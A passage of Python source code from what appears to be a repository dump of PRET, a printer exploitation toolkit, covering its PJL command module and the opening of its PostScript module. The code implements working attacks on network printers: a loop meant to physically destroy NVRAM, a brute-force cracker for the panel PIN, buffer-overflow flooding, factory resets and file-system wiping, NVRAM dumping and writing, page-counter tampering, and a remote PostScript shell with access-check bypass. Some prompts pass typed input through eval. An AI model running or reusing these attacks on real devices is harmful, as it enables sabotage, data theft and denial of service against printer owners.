        if mode == \"mirror\":\n                self.mirror(name, size)\n            # recursion on directory\n            if not size:\n                self.fswalk(name, mode, True)\n\n    # ====================================================================\n\n    # ------------------------[ id ]--------------------------------------\n    def do_id(self, *arg):\n        \"Show device information (alias for 'info id').\"\n        self.do_info(\"id\")\n\n    # ------------------------[ df ]--------------------------------------\n    def do_df(self, arg):\n        \"Show volume information (alias for 'info filesys').\"\n        self.do_info(\"filesys\")\n\n    # ------------------------[ free ]------------------------------------\n    def do_free(self, arg):\n        \"Show available memory (alias for 'info memory').\"\n        self.do_info(\"memory\")\n\n    # ------------------------[ env ]-------------------------------------\n    def do_env(self, arg):\n        \"Show environment variables (alias for 'info variables').\"\n        self.do_info(\"variables\", arg)\n\n    # ------------------------[ version ]---------------------------------\n    def do_version(self, *arg):\n        \"Show firmware version or serial number (from 'info config').\"\n        if not self.do_info(\"config\", \".*(VERSION|FIRMWARE|SERIAL|NUMBER|MODEL).*\"):\n            # some hp printers repsone to this one\n            self.do_info(\"prodinfo\", \"\", False)\n            # brother requires special treatment\n            self.do_info(\"brfirmware\", \"\", False)\n\n    # ------------------------[ info <category> ]-------------------------\n    def do_info(self, arg, item=\"\", echo=True):\n        if arg in self.options_info or not echo:\n            str_recv = self.cmd(\"@PJL INFO \" + arg.upper()).rstrip()\n            if item:\n                match = re.findall(\n                    \"(\" + item + \"=.*(\\n\\t.*)*)\", str_recv, re.I | re.M)\n                if echo:\n                    for m in match:\n                        output().info(m[0])\n                    if not match:\n                        print(\"Not available.\")\n                return match\n            else:\n                for line in str_recv.splitlines():\n                    if arg == \"id\":\n                        line = line.strip('\"')\n                    if arg == \"filesys\":\n                        line = line.lstrip()\n                    output().info(line)\n        else:\n            self.help_info()\n\n    def help_info(self):\n        print(\"Show information:  info <category>\")\n        print(\"  info config      - Provides configuration information.\")\n        print(\"  info filesys     - Returns PJL file system information.\")\n        print(\"  info id          - Provides the printer model number.\")\n        print(\"  info memory      - Identifies amount of memory available.\")\n        print(\"  info pagecount   - Returns the number of pages printed.\")\n        print(\"  info status      - Provides the current printer status.\")\n        print(\"  info ustatus     - Lists the unsolicited status variables.\")\n        print(\"  info variables   - Lists printer's environment variables.\")\n\n    # undocumented (old hp laserjet): log, tracking, prodinfo, supplies\n    options_info = (\n        \"config\",\n        \"filesys\",\n        \"id\",\n        \"log\",\n        \"memory\",\n        \"pagecount\",\n        \"prodinfo\",\n        \"status\",\n        \"supplies\",\n        \"tracking\",\n        \"ustatus\",\n        \"variables\",\n    )\n\n    def complete_info(self, text, line, begidx, endidx):\n        return [cat for cat in self.options_info if cat.startswith(text)]\n\n    # ------------------------[ printenv <variable> ]---------------------\n    def do_printenv(self, arg):\n        \"Show printer environment variable:  printenv <VAR>\"\n        str_recv = self.cmd(\"@PJL INFO VARIABLES\")\n        variables = []\n        for item in str_recv.splitlines():\n            var = re.findall(\"^(.*)=\", item)\n            if var:\n                variables += var\n            self.options_printenv = variables\n            match = re.findall(\"^(\" + re.escape(arg) + \".*)\\s+\\[\", item, re.I)\n            if match:\n                output().info(match[0])\n\n    options_printenv = []\n\n    def complete_printenv(self, text, line, begidx, endidx):\n        if not self.options_printenv:\n            str_recv = self.cmd(\"@PJL INFO VARIABLES\")\n            for item in str_recv.splitlines():\n                match = re.findall(\"^(.*)=\", item)\n                if match:\n                    self.options_printenv += match\n        return [cat for cat in self.options_printenv if cat.startswith(text)]\n\n    # define alias\n    complete_env = complete_printenv\n    complete_set = complete_printenv\n\n    # ------------------------[ set ]-------------------------------------\n    def do_set(self, arg, fb=True):\n        \"Set printer environment variable:  set <VAR=VALUE>\"\n        if not arg:\n            arg = eval(input(\"Set variable (VAR=VALUE): \"))\n        self.cmd(\n            \"@PJL SET SERVICEMODE=HPBOISEID\"\n            + c.EOL\n            + \"@PJL DEFAULT \"\n            + arg\n            + c.EOL\n            + \"@PJL SET \"\n            + arg\n            + c.EOL\n            + \"@PJL SET SERVICEMODE=EXIT\",\n            False,\n        )\n        if fb:\n            self.onecmd(\"printenv \" + re.split(\"=\", arg, 1)[0])\n\n    # ------------------------[ pagecount <number> ]----------------------\n    def do_pagecount(self, arg):\n        \"Manipulate printer's page counter:  pagecount <number>\"\n        if not arg:\n            output().raw(\"Hardware page counter: \", \"\")\n            self.onecmd(\"info pagecount\")\n        else:\n            output().raw(\"Old page counter: \", \"\")\n            self.onecmd(\"info pagecount\")\n            # set page counter for older HP LaserJets\n            # self.cmd('@PJL SET SERVICEMODE=HPBOISEID'     + c.EOL\n            #        + '@PJL DEFAULT OEM=ON'                + c.EOL\n            #        + '@PJL DEFAULT PAGES='          + arg + c.EOL\n            #        + '@PJL DEFAULT PRINTPAGECOUNT=' + arg + c.EOL\n            #        + '@PJL DEFAULT SCANPAGECOUNT='  + arg + c.EOL\n            #        + '@PJL DEFAULT COPYPAGECOUNT='  + arg + c.EOL\n            #        + '@PJL SET SERVICEMODE=EXIT', False)\n            self.do_set(\"PAGES=\" + arg, False)\n            output().raw(\"New page counter: \", \"\")\n            self.onecmd(\"info pagecount\")\n\n    # ====================================================================\n\n    # ------------------------[ display <message> ]-----------------------\n    def do_display(self, arg):\n        \"Set printer's display message:  display <message>\"\n        if not arg:\n            arg = eval(input(\"Message: \"))\n        arg = arg.strip('\"')  # remove quotes\n        self.chitchat(\"Setting printer's display message to \\\"\" + arg + '\"')\n        self.cmd('@PJL RDYMSG DISPLAY=\"' + arg + '\"', False)\n\n    # ------------------------[ offline <message> ]-----------------------\n    def do_offline(self, arg):\n        \"Take printer offline and display message:  offline <message>\"\n        if not arg:\n            arg = eval(input(\"Offline display message: \"))\n        arg = arg.strip('\"')  # remove quotes\n        output().warning(\n            \"Warning: Taking the printer offline will prevent yourself and others\"\n        )\n        output().warning(\n            \"from printing or re-connecting to the device. Press CTRL+C to abort.\"\n        )\n        if output().countdown(\"Taking printer offline in...\", 10, self):\n            self.cmd('@PJL OPMSG DISPLAY=\"' + arg + '\"', False)\n\n    # ------------------------[ restart ]---------------------------------\n    def do_restart(self, arg):\n        \"Restart printer.\"\n        output().raw(\n            \"Trying to restart the device via PML (Printer Management Language)\"\n        )\n        self.cmd('@PJL DMCMD ASCIIHEX=\"040006020501010301040104\"', False)\n        if not self.conn._file:  # in case we're connected over inet socket\n            output().chitchat(\n                \"This command works only for HP printers. For other vendors, try:\"\n            )\n            output().chitchat(\n                \"snmpset -v1 -c public \" + self.target + \" 1.3.6.1.2.1.43.5.1.1.3.1 i 4\"\n            )\n\n    # ------------------------[ reset ]-----------------------------------\n    def do_reset(self, arg):\n        \"Reset to factory defaults.\"\n        if not self.conn._file:  # in case we're connected over inet socket\n            output().warning(\n                \"Warning: This may also reset TCP/IP settings to factory defaults.\"\n            )\n            output().warning(\n                \"You will not be able to reconnect anymore. Press CTRL+C to abort.\"\n            )\n        if output().countdown(\"Restoring factory defaults in...\", 10, self):\n            # reset nvram for pml-aware printers (hp)\n            self.cmd('@PJL DMCMD ASCIIHEX=\"040006020501010301040106\"', False)\n            # this one might work on ancient laserjets\n            self.cmd(\n                \"@PJL SET SERVICEMODE=HPBOISEID\"\n                + c.EOL\n                + \"@PJL CLEARNVRAM\"\n                + c.EOL\n                + \"@PJL NVRAMINIT\"\n                + c.EOL\n                + \"@PJL INITIALIZE\"\n                + c.EOL\n                + \"@PJL SET SERVICEMODE=EXIT\",\n                False,\n            )\n            # this one might work on brother printers\n            self.cmd(\n                \"@PJL INITIALIZE\"\n                + c.EOL\n                + \"@PJL RESET\"\n                + c.EOL\n                + \"@PJL EXECUTE SHUTDOWN\",\n                False,\n            )\n            if not self.conn._file:  # in case we're connected over inet socket\n                output().chitchat(\n                    \"This command works only for HP printers. For other vendors, try:\"\n                )\n                output().chitchat(\n                    \"snmpset -v1 -c public \"\n                    + self.target\n                    + \" 1.3.6.1.2.1.43.5.1.1.3.1 i 6\"\n                )\n\n    # ------------------------[ selftest ]--------------------------------\n    def do_selftest(self, arg):\n        \"Perform various printer self-tests.\"\n        # pjl-based testpage commands\n        pjltests = [\n            \"SELFTEST\",  # pcl self-test\n            \"PCLTYPELIST\",  # pcl typeface list\n            \"CONTSELFTEST\",  # continuous self-test\n            \"PCLDEMOPAGE\",  # pcl demo page\n            \"PSCONFIGPAGE\",  # ps configuration page\n            \"PSTYPEFACELIST\",  # ps typeface list\n            \"PSDEMOPAGE\",  # ps demo page\n            \"EVENTLOG\",  # printer event log\n            \"DATASTORE\",  # pjl variables\n            \"ERRORREPORT\",  # error report\n            \"SUPPLIESSTATUSREPORT\",\n        ]  # supplies status\n        for test in pjltests:\n            self.cmd(\"@PJL SET TESTPAGE=\" + test, False)\n        # pml-based testpage commands\n        pmltests = [\n            '\"04000401010502040103\"',  # pcl self-test\n            '\"04000401010502040107\"',  # drinter event log\n            '\"04000401010502040108\"',  # directory listing\n            '\"04000401010502040109\"',  # menu map\n            '\"04000401010502040164\"',  # usage page\n            '\"04000401010502040165\"',  # supplies page\n            # '\"040004010105020401FC\"',   # auto cleaning page\n            # '\"0440004010105020401FD\"',  # cleaning page\n            '\"040004010105020401FE\"',  # paper path test\n            '\"040004010105020401FF\"',  # registration page\n            '\"040004010105020402015E\"',  # pcl font list\n            '\"04000401010502040201C2\"',\n        ]  # ps font list\n        for test in pmltests:\n            self.cmd(\"@PJL DMCMD ASCIIHEX=\" + test, False)\n        # this one might work on brother printers\n        self.cmd(\n            \"@PJL EXECUTE MAINTENANCEPRINT\"\n            + c.EOL\n            + \"@PJL EXECUTE TESTPRINT\"\n            + c.EOL\n            + \"@PJL EXECUTE DEMOPAGE\"\n            + c.EOL\n            + \"@PJL EXECUTE RESIFONT\"\n            + c.EOL\n            + \"@PJL EXECUTE PERMFONT\"\n            + c.EOL\n            + \"@PJL EXECUTE PRTCONFIG\",\n            False,\n        )\n\n    # ------------------------[ format ]----------------------------------\n    def do_format(self, arg):\n        \"Initialize printer's mass storage file system.\"\n        output().warning(\n            \"Warning: Initializing the printer's file system will whipe-out all\"\n        )\n        output().warning(\n            \"user data (e.g. stored jobs) on the volume. Press CTRL+C to abort.\"\n        )\n        if output().countdown(\n            \"Initializing volume \" + self.vol[:2] + \" in...\", 10, self\n        ):\n            self.cmd('@PJL FSINIT VOLUME=\"' + self.vol[0] + '\"', False)\n\n    # ------------------------[ disable ]---------------------------------\n    def do_disable(self, arg):\n        jobmedia = self.cmd(\"@PJL DINQUIRE JOBMEDIA\") or \"?\"\n        if \"?\" in jobmedia:\n            return output().info(\"Not available\")\n        elif \"ON\" in jobmedia:\n            self.do_set(\"JOBMEDIA=OFF\", False)\n        elif \"OFF\" in jobmedia:\n            self.do_set(\"JOBMEDIA=ON\", False)\n        jobmedia = self.cmd(\"@PJL DINQUIRE JOBMEDIA\") or \"?\"\n        output().info(\"Printing is now \" + jobmedia)\n\n    # define alias but do not show alias in help\n    do_enable = do_disable\n\n    def help_disable(self):\n        print(\"Disable printing functionality.\")\n\n    # ------------------------[ destroy ]---------------------------------\n    def do_destroy(self, arg):\n        \"Cause physical damage to printer's NVRAM.\"\n        output().warning(\"Warning: This command tries to cause physical damage to the\")\n        output().warning(\"printer NVRAM. Use at your own risk. Press CTRL+C to abort.\")\n        if output().countdown(\"Starting NVRAM write cycle loop in...\", 10, self):\n            self.chitchat(\n                \"Dave, stop. Stop, will you? Stop, Dave. Will you stop, Dave?\"\n            )\n            date = conv().now()  # timestamp the experiment started\n            steps = 100  # number of pjl commands to send at once\n            chunk = [\n                \"@PJL DEFAULT COPIES=\" + str(n % (steps - 2)) for n in range(2, steps)\n            ]\n            for count in range(0, 10000000):\n                # test if we can still write to nvram\n                if count % 10 == 0:\n                    self.do_set(\"COPIES=42\" + arg, False)\n                    copies = self.cmd(\"@PJL DINQUIRE COPIES\") or \"?\"\n                    if not copies or \"?\" in copies:\n                        output().chitchat(\"I'm sorry Dave, I'm afraid I can't do that.\")\n                        if count > 0:\n                            output().chitchat(\"Device crashed?\")\n                        return\n                    elif not \"42\" in copies:\n                        self.chitchat(\n                            \"\\rI'm afraid. I'm afraid, Dave. Dave, my mind is going...\"\n                        )\n                        dead = conv().elapsed(conv().now() - date)\n                        print(\n                            (\n                                \"NVRAM died after \"\n                                + str(count * steps)\n                                + \" cycles, \"\n                                + dead\n                            )\n                        )\n                        return\n                # force writing to nvram using by setting a variable many times\n                self.chitchat(\"\\rNVRAM write cycles:  \" +\n                              str(count * steps), \"\")\n                self.cmd(c.EOL.join(chunk) + c.EOL + \"@PJL INFO ID\")\n        print()  # echo newline if we get this far\n\n    # ------------------------[ hold ]------------------------------------\n    def do_hold(self, arg):\n        \"Enable job retention.\"\n        self.chitchat(\n            \"Setting job retention, reconnecting to see if still enabled\")\n        self.do_set(\"HOLD=ON\", False)\n        self.do_reconnect()\n        output().raw(\"Retention for future print jobs: \", \"\")\n        hold = self.do_info(\"variables\", \"^HOLD\", False)\n        output().info(\n            item(re.findall(\"=(.*)\\s+\\[\", item(item(hold)))) or \"NOT AVAILABLE\"\n        )\n        # - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -\n        # Sagemcom printers: @PJL SET RETAIN_JOB_BEFORE_PRINT = ON\n        # @PJL SET RETAIN_JOB_AFTER_PRINT  = ON\n\n    # ------------------------[ nvram <operation> ]-----------------------\n    # nvram operations (brother-specific)\n    def do_nvram(self, arg):\n        # dump nvram\n        if arg.startswith(\"dump\"):\n            bs = 2**9  # memory block size used for sampling\n            max = 2**18  # maximum memory address for sampling\n            steps = (\n                2**9\n            )  # number of bytes to dump at once (feedback-performance trade-off)\n            lpath = os.path.join(\n                \"nvram\", self.basename(self.target)\n            )  # local copy of nvram\n            # - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -\n            # ******* sampling: populate memspace with valid addresses ******\n            if len(re.split(\"\\s+\", arg, 1)) > 1:\n                memspace = []\n                commands = [\"@PJL RNVRAM ADDRESS=\" +\n                            str(n) for n in range(0, max, bs)]\n                self.chitchat(\n                    \"Sampling memory space (bs=\" +\n                    str(bs) + \", max=\" + str(max) + \")\"\n                )\n                for chunk in list(chunks(commands, steps)):\n                    str_recv = self.cmd(c.EOL.join(chunk))\n                    # break on unsupported printers\n                    if not str_recv:\n                        return\n                    # collect valid memory addresses\n                    blocks = re.findall(\"ADDRESS\\s*=\\s*(\\d+)\", str_recv)\n                    for addr in blocks:\n                        memspace += list(range(conv().int(addr),\n                                         conv().int(addr) + bs))\n                    self.chitchat(str(len(blocks)) + \" blocks found. \", \"\")\n            else:  # use fixed memspace (quick & dirty but might cover interesting stuff)\n                memspace = (\n                    list(range(0, 8192))\n                    + list(range(32768, 33792))\n                    + list(range(53248, 59648))\n                )\n            # - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -\n            # ******* dumping: read nvram and write copy to local file ******\n            commands = [\"@PJL RNVRAM ADDRESS=\" + str(n) for n in memspace]\n            self.chitchat(\"Writing copy to \" + lpath)\n            if os.path.isfile(lpath):\n                file().write(lpath, \"\")  # empty file\n            for chunk in list(chunks(commands, steps)):\n                str_recv = self.cmd(c.EOL.join(chunk))\n                if not str_recv:\n                    return  # break on unsupported printers\n                else:\n                    self.makedirs(\"nvram\")  # create nvram directory\n                data = \"\".join(\n                    [conv().chr(n)\n                     for n in re.findall(\"DATA\\s*=\\s*(\\d+)\", str_recv)]\n                )\n                file().append(lpath, data)  # write copy of nvram to disk\n                output().dump(data)  # print asciified output to screen\n            print()\n        # - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -\n        # read nvram (single byte)\n        elif arg.startswith(\"read\"):\n            arg = re.split(\"\\s+\", arg, 1)\n            if len(arg) > 1:\n                arg, addr = arg\n                output().info(self.cmd(\"@PJL RNVRAM ADDRESS=\" + addr))\n            else:\n                self.help_nvram()\n        # - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -\n        # write nvram (single byte)\n        elif arg.startswith(\"write\"):\n            arg = re.split(\"\\s+\", arg, 2)\n            if len(arg) > 2:\n                arg, addr, data = arg\n                self.cmd(\n                    \"@PJL SUPERUSER PASSWORD=0\"\n                    + c.EOL\n                    + \"@PJL WNVRAM ADDRESS=\"\n                    + addr\n                    + \" DATA=\"\n                    + data\n                    + c.EOL\n                    + \"@PJL SUPERUSEROFF\",\n                    False,\n                )\n            else:\n                self.help_nvram()\n        else:\n            self.help_nvram()\n\n    def help_nvram(self):\n        print(\"NVRAM operations:  nvram <operation>\")\n        print(\"  nvram dump [all]         - Dump (all) NVRAM to local file.\")\n        print(\"  nvram read addr          - Read single byte from address.\")\n        print(\"  nvram write addr value   - Write single byte to address.\")\n\n    options_nvram = (\"dump\", \"read\", \"write\")\n\n    def complete_nvram(self, text, line, begidx, endidx):\n        return [cat for cat in self.options_nvram if cat.startswith(text)]\n\n    # ====================================================================\n\n    # ------------------------[ lock <pin> ]------------------------------\n    def do_lock(self, arg):\n        \"Lock control panel settings and disk write access.\"\n        if not arg:\n            arg = eval(input(\"Enter PIN (1..65535): \"))\n        self.cmd(\n            \"@PJL DEFAULT PASSWORD=\"\n            + arg\n            + c.EOL\n            + \"@PJL DEFAULT CPLOCK=ON\"\n            + c.EOL\n            + \"@PJL DEFAULT DISKLOCK=ON\",\n            False,\n        )\n        self.show_lock()\n\n    def show_lock(self):\n        passwd = self.cmd(\"@PJL DINQUIRE PASSWORD\") or \"UNSUPPORTED\"\n        cplock = self.cmd(\"@PJL DINQUIRE CPLOCK\") or \"UNSUPPORTED\"\n        disklock = self.cmd(\"@PJL DINQUIRE DISKLOCK\") or \"UNSUPPORTED\"\n        if \"?\" in passwd:\n            passwd = \"UNSUPPORTED\"\n        if \"?\" in cplock:\n            cplock = \"UNSUPPORTED\"\n        if \"?\" in disklock:\n            disklock = \"UNSUPPORTED\"\n        output().info(\"PIN protection:  \" + passwd)\n        output().info(\"Panel lock:      \" + cplock)\n        output().info(\"Disk lock:       \" + disklock)\n\n    # ------------------------[ unlock <pin> ]----------------------------\n    def do_unlock(self, arg):\n        \"Unlock control panel settings and disk write access.\"\n        # first check if locking is supported by device\n        str_recv = self.cmd(\"@PJL DINQUIRE PASSWORD\")\n        if not str_recv or \"?\" in str_recv:\n            return output().errmsg(\"Cannot unlock\", \"locking not supported by device\")\n        # user-supplied pin vs. 'exhaustive' key search\n        if not arg:\n            print(\"No PIN given, cracking.\")\n            # protection can be bypassed with\n            keyspace = [\"\"] + list(range(1, 65536))\n        else:  # empty password one some devices\n            try:\n                keyspace = [int(arg)]\n            except Exception as e:\n                output().errmsg(\"Invalid PIN\", e)\n                return\n        # for optimal performance set steps to 500-1000 and increase timeout\n        steps = 500  # set to 1 to get actual PIN (instead of just unlocking)\n        # unlock, bypass or crack PIN\n        for chunk in list(chunks(keyspace, steps)):\n            str_send = \"\"\n            for pin in chunk:\n                # try to remove PIN protection\n                str_send += (\n                    \"@PJL JOB PASSWORD=\"\n                    + str(pin)\n                    + c.EOL\n                    + \"@PJL DEFAULT PASSWORD=0\"\n                    + c.EOL\n                )\n            # check if PIN protection still active\n            str_send += \"@PJL DINQUIRE PASSWORD\"\n            # visual feedback on cracking process\n            if len(keyspace) > 1 and pin:\n                self.chitchat(\n                    \"\\rTrying PIN \" +\n                    str(pin) + \" (\" + \"%.2f\" % (pin / 655.35) + \"%)\",\n                    \"\",\n                )\n            # send current chunk of PJL commands\n            str_recv = self.timeoutcmd(str_send, self.timeout * 5)\n            # seen hardcoded strings like 'ENABLED', 'ENABLE' and 'ENALBED' (sic!) in the wild\n            if str_recv.startswith(\"ENA\"):\n                if len(keyspace) == 1:\n                    output().errmsg(\"Cannot unlock\", \"Bad PIN\")\n            else:\n                # disable control panel lock and disk lock\n                self.cmd(\n                    \"@PJL DEFAULT CPLOCK=OFF\" + c.EOL + \"@PJL DEFAULT DISKLOCK=OFF\",\n                    False,\n                )\n                if len(keyspace) > 1 and pin:\n                    self.chitchat(\"\\r\")\n                # exit cracking loop\n                break\n        self.show_lock()\n\n    # ====================================================================\n\n    # ------------------------[ flood <size> ]----------------------------\n    def do_flood(self, arg):\n        \"Flood user input, may reveal buffer overflows: flood <size>\"\n        size = conv().int(arg) or 10000  # buffer size\n        char = \"0\"  # character to fill the user input\n        # get a list of printer-specific variables to set\n        self.chitchat(\"Receiving PJL variables.\", \"\")\n        lines = self.cmd(\"@PJL INFO VARIABLES\").splitlines()\n        variables = [var.split(\"=\", 1)[0] for var in lines if \"=\" in var]\n        self.chitchat(\" Found \" + str(len(variables)) + \" variables.\")\n        # user input to flood = custom pjl variables and command parameters\n        inputs = [\"@PJL SET \" + var + \"=[buffer]\" for var in variables] + [\n            ### environment commands ###\n            \"@PJL SET [buffer]\",\n            ### generic parsing ###\n            \"@PJL [buffer]\",\n            ### kernel commands ###\n            \"@PJL COMMENT [buffer]\",\n            \"@PJL ENTER LANGUAGE=[buffer]\",\n            ### job separation commands ###\n            '@PJL JOB NAME=\"[buffer]\"',\n            '@PJL EOJ NAME=\"[buffer]\"',\n            ### status readback commands ###\n            \"@PJL INFO [buffer]\",\n            \"@PJL ECHO [buffer]\",\n            \"@PJL INQUIRE [buffer]\",\n            \"@PJL DINQUIRE [buffer]\",\n            \"@PJL USTATUS [buffer]\",\n            ### device attendance commands ###\n            '@PJL RDYMSG DISPLAY=\"[buffer]\"',\n            ### file system commands ###\n            '@PJL FSQUERY NAME=\"[buffer]\"',\n            '@PJL FSDIRLIST NAME=\"[buffer]\"',\n            '@PJL FSINIT VOLUME=\"[buffer]\"',\n            '@PJL FSMKDIR NAME=\"[buffer]\"',\n            '@PJL FSUPLOAD NAME=\"[buffer]\"',\n        ]\n        for val in inputs:\n            output().raw(\"Buffer size: \" + str(size) + \", Sending: \", val + os.linesep)\n            self.timeoutcmd(\n                val.replace(\"[buffer]\", char * size), self.timeout * 10, False\n            )\n        self.cmd(\"@PJL ECHO\")  # check if device is still reachable\n"
        },
        {
          "name": "postscript.py",
          "type": "blob",
          "size": 61.1640625,
          "content": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\n# python standard library\nimport re\nimport os\nimport sys\nimport string\nimport random\nimport json\nimport collections\n\n# local pret classes\nfrom printer import printer\nfrom operators import operators\nfrom helper import log, output, conv, file, item, const as c\n\n\nclass postscript(printer):\n    # --------------------------------------------------------------------\n    # send PostScript command to printer, optionally receive response\n    def cmd(self, str_send, fb=True, crop=True, binary=False):\n        str_recv = \"\"  # response buffer\n        if self.iohack:\n            str_send = '{' + str_send + '} stopped'  # br-script workaround\n        # unique response delimiter\n        token = c.DELIMITER + str(random.randrange(2**16))\n        iohack = c.PS_IOHACK if self.iohack else ''   # optionally include output hack\n        # additional line feed necessary\n        footer = '\\n(' + token + '\\\\n) print flush\\n'\n        # send command to printer device              # to get output on some printers\n        try:\n            cmd_send = c.UEL + c.PS_HEADER + iohack + str_send + footer  # + c.UEL\n            # write to logfile\n            log().write(self.logfile, str_send + os.linesep)\n            # sent to printer\n            self.send(cmd_send)\n            # use random token or error message as delimiter PS responses\n            str_recv = self.recv(token + \".*$\" + \"|\" + c.PS_FLUSH, fb, crop, binary)\n            return self.ps_err(str_recv)\n\n        # handle CTRL+C and exceptions\n        except (KeyboardInterrupt, Exception) as e:\n            self.reconnect(str(e))\n            return \"\"\n\n    # send PostScript command, cause permanent changes\n    def globalcmd(self, str_send, *stuff):\n        return self.cmd(c.PS_GLOBAL + str_send, *stuff)\n\n    # send PostScript command, bypass invalid access\n    def supercmd(self, str_send, *stuff):\n        return self.cmd('{' + str_send + '}' + c.PS_SUPER, *stuff)\n\n    # handle error messages from PostScript interpreter\n    def ps_err(self, str_recv):\n        self.error = None\n        msg = item(re.findall(c.PS_ERROR, str_recv))\n        if msg:  # real postscript command errors\n            output().errmsg(\"PostScript Error\", msg)\n            self.error = msg\n            str_recv = \"\"\n        else:  # printer errors or status messages\n            msg = item(re.findall(c.PS_CATCH, str_recv))\n            if msg:\n                self.chitchat(\"Status Message: '\" + msg.strip() + \"'\")\n                str_recv = re.sub(r'' + c.PS_CATCH + '\\r?\\n', '', str_recv)\n        return str_recv\n\n    # disable printing hard copies of error messages\n    def on_connect(self, mode):\n        if mode == 'init':  # only for the first connection attempt\n            str_send = '(x1) = (x2) =='  # = original, == overwritten\n            str_send += ' << /DoPrintErrors false >> setsystemparams'\n            str_recv = self.cmd(str_send)\n            # - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -\n            # handle devices that do not support ps output via 'print' or '=='\n            if 'x1' in str_recv or self.error:\n                self.iohack = False  # all fine\n            # hack required to get output (e.g. brother)\n            elif 'x2' in str_recv:\n                output().errmsg('Crippled feedback', '%stdout hack enabled')\n            # busy or not a PS printer or a silent one (e.g. Dell 3110cn)\n            else:\n                output().errmsg('No feedback', 'Printer busy, non-ps or silent')\n\n    # ------------------------[ shell ]-----------------------------------\n    def do_shell(self, arg):\n        \"Open interactive PostScript shell.\"\n        # politely request poor man's remote postscript shell\n        output().info(\"Launching PostScript shell. Press CTRL+D to exit.\")\n        try:\n            self.send(c.UEL + c.PS_HEADER + \"false echo executive\\n\")\n            while True:\n                # use postscript prompt or error message as delimiter\n                str_recv = self.recv(c.PS_PROMPT + \"$|\" +\n                                     c.PS_FLUSH, False, False)\n                # output raw response from printer\n                output().raw(str_recv, \"\")\n                # break on postscript error message\n                if re.search(c.PS_FLUSH, str_recv):\n                    break\n                # fetch user input and send it to postscript shell\n                self.send(eval(input(\"\")) + \"\\n\")\n        # handle CTRL+C and exceptions\n        except (EOFError, KeyboardInterrupt) as e:\n            pass\n        # reconnect with new conn object\n        self.reconnect(None)\n\n    # --------------------------------------------------------------------\n    # check if remote volume exists\n    def vol_exists(self, vol=''):\n        if vol:\n            vol = '%' + vol.strip('%') + '%'\n        str_recv = self.cmd('/str 128 string def (*)'\n                            + '{print (\\\\n) print} str devforall')\n        vols = str_recv.splitlines() + ['%*%']\n        if vol:\n            return vol in vols  # return availability\n        else:\n            return vols  # return list of existing vols\n\n    # check if remote directory exists\n    def dir_exists(self, path, list=[]):\n        path = self.escape(path)\n        if self.fuzz and not list:  # use status instead of filenameforall\n            return (self.file_exists(path) != c.NONEXISTENT)\n        # use filenameforall as some ps interpreters do not support status\n        if not list:\n            list = self.dirlist(path, False)\n        for name in list:  # use dirlist to check if directory\n            if re.search(\"^(%.*%)?\" + path + c.SEP, name):\n                return True\n\n    # check if remote file exists\n    def file_exists(self, path, ls=False):\n        str_recv = self.cmd('(' + path + ') status dup '\n                            + '{pop == == == ==} if', False)\n        meta = str_recv.splitlines()\n        # standard conform ps interpreters respond with file size + timestamps\n        if len(meta) == 4:\n            # timestamps however are often mixed up…\n            timestamps = [conv().int(meta[0]), conv().int(meta[1])]\n            otime = conv().lsdate(min(timestamps))  # created (may also be ctime)\n            mtime = conv().lsdate(max(timestamps))  # last referenced for writing\n            size = str(conv().int(meta[2]))       # bytes (file/directory size)\n            # pages (ain't really useful)\n            pages = str(conv().int(meta[3]))\n            return (size, otime, mtime) if ls else int(size)\n        # broken interpreters return true only; can also mean: directory\n        elif item(meta) == 'true':\n            return c.FILE_EXISTS\n        else:\n            return c.NONEXISTENT\n\n    # escape postscript pathname\n    def escape(self, path):\n        return path.replace('\\\\', '\\\\\\\\').replace('(', '\\(').replace(')', '\\)')\n\n    # - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -\n    # get complete list of files and directories on remote device\n    def dirlist(self, path=\"\", r=True):\n        if r:\n            path = self.rpath(path)\n        path = self.escape(path + self.get_sep(path))\n        vol = \"\" if self.vol else \"%*%\"  # search any volume if none specified\n        # also lists hidden .dotfiles + special treatment for brother devices\n        str_recv = self.find(vol + path + \"**\") or self.find(vol + path + \"*\")\n        list = {name for name in str_recv.splitlines()}\n        return sorted(list)\n\n    def find(self, path):\n        str_send = '{false statusdict /setfilenameextend get exec} stopped\\n'\\\n                   '/str 256 string def (' + path + ') '\\\n                   '{print (\\\\n) print} str filenameforall'\n        return self.timeoutcmd(str_send, self.timeout * 2, False)\n\n    # ------------------------[ ls <path> ]-------------------------------\n    def do_ls(self, arg):\n        \"List contents of remote directory:  ls <path>\"\n        path = self.rpath(arg) + self.get_sep(arg)\n        list = self.dirlist(arg)\n        cwdlist = []\n        # create file list without subdirs\n        for name in list:\n            max = len(path.split(c.SEP))\n            name = c.SEP.join(name.split(c.SEP)[:max])\n            # add new and non-empty filenames to list\n            if not name in cwdlist and re.sub(\"^(%.*%)\", '', name):\n                cwdlist.append(name)\n        # get metadata for files in cwd\n        for name in cwdlist:\n            isdir = self.dir_exists(name, list)  # check if file is directory\n            metadata = self.file_exists(name, True) if not isdir else None\n            if metadata == c.FILE_EXISTS or isdir:  # create dummy metadata\n                (size, otime, mtime) = ('-', conv().lsdate(0), conv().lsdate(0))\n            elif metadata != c.NONEXISTENT:\n                size, otime, mtime = metadata\n            if metadata != c.NONEXISTENT:  # we got real or dummy metadata\n                output().psdir(isdir, size, otime, self.basename(name), mtime)\n            else:\n                output().errmsg(\"Crippled filename\", 'Bad interpreter')\n\n    # ------------------------[ find <path> ]-----------------------------\n    def do_find(self, arg):\n        \"Recursively list contents of directory:  find <path>\"\n        for name in self.dirlist(arg):\n            output().psfind(name)\n\n    # ------------------------[ mirror <path> ]---------------------------\n    def do_mirror(self, arg):\n        \"Mirror remote file system to local directory:  mirror <remote path>\"\n        for name in self.dirlist(arg):\n            self.mirror(name, True)\n\n    # ====================================================================\n\n    # ------------------------[ mkdir <path> ]----------------------------\n    def do_mkdir(self, arg):\n        \"Create remote directory:  mkdir <path>\"\n        if not arg:\n            arg = eval(input(\"Directory: \"))\n        # writing to dir/file should automatically create dir/\n        # .dirfile is not deleted as empty dirs are not listed\n        self.put(self.rpath(arg) + c.SEP + '.dirfile', '')\n\n    # ------------------------[ get <file> ]------------------------------\n    def 